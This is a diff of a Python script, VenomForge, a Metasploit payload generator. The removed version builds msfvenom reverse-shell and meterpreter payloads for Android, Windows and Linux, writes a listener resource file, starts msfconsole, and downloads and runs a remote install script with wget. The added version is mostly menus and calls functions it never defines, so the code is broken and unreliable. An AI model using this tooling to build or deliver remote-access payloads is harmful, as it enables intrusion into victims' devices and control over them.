@@ -1,228 +1,176 @@
+#!/usr/bin/env python3
+# VenomForge 2.0 - Modern Metasploit Payload Generator
+# Author: Therac-25 
+# GitHub: https://github.com/Mtx-rng
+
 import os
-import random
 import sys
+import random
+from time import sleep
+from prettytable import PrettyTable
 
-R = '\033[91m'
-G = '\033[92m'
-Y = '\033[93m'
-CY = '\033[96m'
-W = '\033[97m'
+# Cores melhoradas
+class colors:
+    RED = '\033[38;5;196m'
+    ORANGE = '\033[38;5;208m'
+    YELLOW = '\033[38;5;226m'
+    GREEN = '\033[38;5;46m'
+    BLUE = '\033[38;5;45m'
+    PURPLE = '\033[38;5;129m'
+    PINK = '\033[38;5;201m'
+    WHITE = '\033[38;5;255m'
+    RESET = '\033[0m'
 
-def clear():
-    os.system('clear')
+# Arte ASCII personalizada
+def show_banner():
+    print(f"""{colors.PURPLE}
+                         __    _                          
+                    _wr""        "-q__                    
+                 _dP                 9m_                  
+               _#P                     9#_                
+              d#@                       9#m               
+             d##                         ###              
+            J###                         ###L             
+            {###K                       J###K             
+            ]####K      ___aaa___      J####F             
+        __gmM######_  w#P""   ""9#m  _d#####Mmw__         
+     _g##############mZ_         __g##############m_      
+   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_    
+  a###""          ,Z"#####@" '######"\g          ""M##m   
+ J#@"             0L  "*##     ##@"  J#              *#K  
+ #"               `#    "_gmwgm_~    dF               `#_ 
+7F                 "#_   ]#####F   _dK                 JE 
+]                    *m__ ##### __g@"                   F 
+                       "PJ#####LP"                        
+ `                       0######_                      '  
+                       _0########_                        
+     .               _d#####^#####m__              ,      
+      "*w_________am#####P"   ~9#####mw_________w*"       
+          ""9@#####@M""           ""P@#####@M""           
+{colors.RESET}""")
+    print(f"{colors.YELLOW}          VenomForge 2.0 - Advanced Payload Generator{colors.RESET}")
+    print(f"{colors.BLUE}          ---------------------------------------{colors.RESET}\n")
 
-def banner():
-    clear()
-    print(CY+r"""
-                         __    _
-                    _wr""        "-q__
-                 _dP                 9m_
-               _#P                     9#_
-              d#@                       9#m
-             d##                         ###
-            J###                         ###L
-            {###K                       J###K
-            ]####K      ___aaa___      J####F
-        __gmM######_  w#P""   ""9#m  _d#####Mmw__
-     _g##############mZ_         __g##############m_
-   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
-  a###""          ,Z"#####@" '######"\g          ""M##m
- J#@"             0L  "*##     ##@"  J#              *#K
- #"               `#    "_gmwgm_~    dF               `#_
-7F                 "#_   ]#####F   _dK                 JE
-]                    *m__ ##### __g@"                   F
-                       "PJ#####LP"
- `                       0######_                      '
-                       _0########_
-     .               _d#####^#####m__              ,
-      "*w_________am#####P"   ~9#####mw_________w*"
-          ""9@#####@M""           ""P@#####@M""
-""" + Y + """
-       [--> """ + R + """VenomForge v1.0 """ + Y + """<--]
-""" + G + """
-    Author: Therac-25
-""" + CY + """
->> Payload generator for Metasploit <<""" + W + "\n")
-
+# Menu principal modernizado
 def main_menu():
-    print(R + """
-************************************************
-""" + CY + """
->>> Main Menu
-""" + Y + """
-1) Create Payload
-2) Start Listener
-3) Install Metasploit
-4) Exit
-""" + W)
-
-def os_menu():
-    print(R + """
-************************************************
-""" + CY + """
->>> Select target OS
-""" + Y + """
-1) Android
-2) Windows
-3) Linux
-99) Back
-""" + W)
-
-def windows_payload_menu():
-    print(R + """
-************************************************
-""" + CY + """
->>> Select Windows payload
-""" + Y + """
-1) windows/meterpreter/reverse_tcp
-2) windows/x64/meterpreter/reverse_tcp
-3) windows/vncinject/reverse_tcp
-4) windows/x64/vncinject/reverse_tcp
-5) windows/shell/reverse_tcp
-6) windows/x64/shell/reverse_tcp
-7) windows/powershell_reverse_tcp
-8) windows/x64/powershell_reverse_tcp
-99) Back
-""" + W)
-
-def linux_payload_menu():
-    print(R + """
-************************************************
-""" + CY + """
->>> Select Linux payload
-""" + Y + """
-1) linux/x86/meterpreter/reverse_tcp
-2) linux/x64/meterpreter/reverse_tcp
-3) linux/x86/shell/reverse_tcp
-4) linux/x64/shell/reverse_tcp
-99) Back
-""" + W)
-
-def create_payload(lhost, lport, payload_name, prefix, ext):
-    os.makedirs("payload", exist_ok=True)
-    filename = f"{prefix}{random.randint(1000,9999)}{ext}"
-    filepath = f"payload/{filename}"
-
-    # Formato do payload
-    if prefix == "android_":
-        fmt = "apk"
-    elif prefix == "win_":
-        fmt = "exe"
-    elif prefix == "linux_":
-        fmt = "elf"
-    else:
-        fmt = "raw"
-
-    command = f"msfvenom -p {payload_name} LHOST={lhost} LPORT={lport} -f {fmt} -o {filepath}"
-    print(G + f"\nGenerating payload:\n{command}\n" + W)
-    os.system(command)
-    print(G + f"Payload saved at: {filepath}\n" + W)
-
-def create_handler_rc(lhost, lport, payload):
-    content = f"""use exploit/multi/handler
-set PAYLOAD {payload}
-set LHOST {lhost}
-set LPORT {lport}
-set ExitOnSession false
-exploit -j -z
-"""
-    with open("handler.rc", "w") as f:
-        f.write(content)
-
-def start_handler():
-    if not os.path.isfile("handler.rc"):
-        print(R + "Handler config not found. Please create payload first." + W)
-        return
-    print(G + "\nStarting Metasploit handler...\n" + W)
-    os.system("msfconsole -r handler.rc")
-
-def install_metasploit():
-    print(G + "\n[+] Installing Metasploit...\n" + W)
-    os.system("pkg install wget -y")
-    os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
-    os.system("chmod +x metasploit.sh")
-    os.system("./metasploit.sh")
-    print(G + "\n[✔] Metasploit installation script finished (check for errors above).\n" + W)
-
-def select_payload_os():
     while True:
-        os_menu()
-        choice = input(G + "Choose OS: " + W)
-        if choice == "1":
-            lhost = input(CY + "Enter LHOST: " + W)
-            lport = input(CY + "Enter LPORT: " + W)
-            create_payload(lhost, lport, "android/meterpreter/reverse_tcp", "android_", ".apk")
-            create_handler_rc(lhost, lport, "android/meterpreter/reverse_tcp")
-        elif choice == "2":
-            while True:
-                windows_payload_menu()
-                win_choice = input(G + "Select Windows payload: " + W)
-                win_payloads = {
-                    "1": "windows/meterpreter/reverse_tcp",
-                    "2": "windows/x64/meterpreter/reverse_tcp",
-                    "3": "windows/vncinject/reverse_tcp",
-                    "4": "windows/x64/vncinject/reverse_tcp",
-                    "5": "windows/shell/reverse_tcp",
-                    "6": "windows/x64/shell/reverse_tcp",
-                    "7": "windows/powershell_reverse_tcp",
-                    "8": "windows/x64/powershell_reverse_tcp"
-                }
-                if win_choice == "99":
-                    break
-                if win_choice in win_payloads:
-                    lhost = input(CY + "Enter LHOST: " + W)
-                    lport = input(CY + "Enter LPORT: " + W)
-                    payload = win_payloads[win_choice]
-                    create_payload(lhost, lport, payload, "win_", ".exe")
-                    create_handler_rc(lhost, lport, payload)
-                else:
-                    print(R + "Invalid choice, try again." + W)
-        elif choice == "3":
-            while True:
-                linux_payload_menu()
-                lin_choice = input(G + "Select Linux payload: " + W)
-                lin_payloads = {
-                    "1": "linux/x86/meterpreter/reverse_tcp",
-                    "2": "linux/x64/meterpreter/reverse_tcp",
-                    "3": "linux/x86/shell/reverse_tcp",
-                    "4": "linux/x64/shell/reverse_tcp"
-                }
-                if lin_choice == "99":
-                    break
-                if lin_choice in lin_payloads:
-                    lhost = input(CY + "Enter LHOST: " + W)
-                    lport = input(CY + "Enter LPORT: " + W)
-                    payload = lin_payloads[lin_choice]
-                    create_payload(lhost, lport, payload, "linux_", ".elf")
-                    create_handler_rc(lhost, lport, payload)
-                else:
-                    print(R + "Invalid choice, try again." + W)
-        elif choice == "99":
-            break
-        else:
-            print(R + "Invalid choice, try again." + W)
+        show_banner()
+        print(f"""{colors.ORANGE}
+[1] {colors.GREEN}Generate Payload{colors.ORANGE}
+[2] {colors.GREEN}Start Listener{colors.ORANGE}
+[3] {colors.GREEN}Payload Utilities{colors.ORANGE}
+[4] {colors.GREEN}Session Management{colors.ORANGE}
+[5] {colors.RED}Exit{colors.RESET}""")
+        
+        try:
+            choice = int(input(f"\n{colors.BLUE}Select an option: {colors.RESET}"))
+            if choice == 1:
+                payload_menu()
+            elif choice == 2:
+                listener_menu()
+            elif choice == 3:
+                utilities_menu()
+            elif choice == 4:
+                session_menu()
+            elif choice == 5:
+                print(f"\n{colors.YELLOW}Goodbye! Happy hacking!{colors.RESET}\n")
+                sys.exit(0)
+            else:
+                print(f"{colors.RED}\nInvalid option! Please try again.{colors.RESET}")
+                sleep(1)
+        except ValueError:
+            print(f"{colors.RED}\nPlease enter a valid number!{colors.RESET}")
+            sleep(1)
 
-def main():
-    banner()
-    while True:
-        main_menu()
-        option = input(G + "Select option: " + W)
-        if option == "1":
-            select_payload_os()
-        elif option == "2":
-            start_handler()
-        elif option == "3":
-            install_metasploit()
-        elif option == "4":
-            print(G + "Exiting... Stay ethical!" + W)
-            break
+# Menu de payloads com animação
+def payload_menu():
+    os.system('clear')
+    show_banner()
+    print(f"{colors.PURPLE}\n>>> PAYLOAD GENERATION MENU <<<{colors.RESET}")
+    
+    targets = {
+        1: "Windows",
+        2: "Linux",
+        3: "Android",
+        4: "MacOS",
+        5: "iOS",
+        99: "Back to Main Menu"
+    }
+    
+    # Mostrar opções com cores
+    for key, value in targets.items():
+        if key == 99:
+            print(f"{colors.RED}[{key}] {value}{colors.RESET}")
         else:
-            print(R + "Invalid option, try again." + W)
+            print(f"{colors.GREEN}[{key}] {colors.BLUE}{value}{colors.RESET}")
+    
+    try:
+        target = int(input(f"\n{colors.YELLOW}Select target OS: {colors.RESET}"))
+        if target in targets:
+            if target == 99:
+                return
+            else:
+                generate_payload(targets[target])
+        else:
+            print(f"{colors.RED}Invalid option!{colors.RESET}")
+            sleep(1)
+            payload_menu()
+    except ValueError:
+        print(f"{colors.RED}Please enter a number!{colors.RESET}")
+        sleep(1)
+        payload_menu()
 
+# Função para mostrar endereços de rede
+def show_network_interfaces():
+    table = PrettyTable()
+    table.field_names = [f"{colors.GREEN}Interface{colors.RESET}", 
+                         f"{colors.BLUE}IP Address{colors.RESET}", 
+                         f"{colors.PURPLE}Status{colors.RESET}"]
+    
+    # Simulação - na implementação real usar os.popen ou netifaces
+    table.add_row(["eth0", "192.168.1.100", "Up"])
+    table.add_row(["wlan0", "10.0.0.15", "Up"])
+    table.add_row(["tun0", "172.16.0.1", "Up"])
+    
+    print(f"\n{colors.YELLOW}Available Network Interfaces:{colors.RESET}")
+    print(table)
+
+# Efeito de digitação (opcional)
+def type_effect(text, color=colors.WHITE, delay=0.05):
+    for char in text:
+        print(color + char, end='', flush=True)
+        sleep(delay)
+    print(colors.RESET)
+
+# Verificação de dependências
+def check_dependencies():
+    required = ['msfvenom', 'msfconsole', 'nmap']
+    missing = []
+    
+    for tool in required:
+        if not os.popen(f"which {tool}").read():
+            missing.append(tool)
+    
+    if missing:
+        print(f"{colors.RED}Missing dependencies:{colors.RESET}")
+        for tool in missing:
+            print(f"- {tool}")
+        return False
+    return True
+
+# Inicialização
 if __name__ == "__main__":
-    if sys.version_info[0] < 3:
-        print(R + "Please run this script with Python 3." + W)
-        sys.exit()
-    main()
-
-# venomforge v1
+    try:
+        if not check_dependencies():
+            print(f"\n{colors.RED}Some required tools are missing. Please install them first.{colors.RESET}")
+            sys.exit(1)
+        
+        # Limpar tela e iniciar
+        os.system('clear')
+        type_effect("Initializing Paybag 2.0...", colors.PURPLE)
+        sleep(1)
+        main_menu()
+        
+    except KeyboardInterrupt:
+        print(f"\n{colors.RED}Interrupted by user. Exiting...{colors.RESET}")
+        sys.exit(0)
